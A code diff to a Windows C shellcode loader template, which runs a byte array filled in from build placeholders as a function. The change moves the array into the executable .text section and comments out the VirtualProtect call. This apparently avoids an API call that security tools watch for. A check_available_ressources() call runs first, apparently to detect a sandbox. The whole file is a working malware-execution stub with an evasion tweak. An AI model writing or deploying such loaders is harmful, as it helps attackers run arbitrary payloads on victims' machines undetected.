@@ -1,7 +1,8 @@
 #include <windows.h>
 #include <stdio.h>
 
-// shellcode array
+// shellcode array in the .text section with -Wl, --omagic to avoid the VirtualProtect call
+__attribute__((section(".text")))
 static unsigned char bytecode[SET_BYTECODE_SIZE] = SET_BYTECODE_ARRAY;
 static const int bytecode_size = SET_BYTECODE_SIZE;
     
@@ -39,12 +40,12 @@ void check_available_ressources()
 
 int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
 {
-    DWORD dummy; // dummy but real dword pointer for the VirtualProtect call
+    // DWORD dummy; // dummy but real dword pointer for the VirtualProtect call
 
     check_available_ressources();
 
-    VirtualProtect(bytecode, bytecode_size,
-            PAGE_EXECUTE_READWRITE, &dummy);
+    // VirtualProtect(bytecode, bytecode_size,
+    //         PAGE_EXECUTE_READWRITE, &dummy);
 
     // cast the array to a function
     void (*function)(void) = (void (*)(void))bytecode;
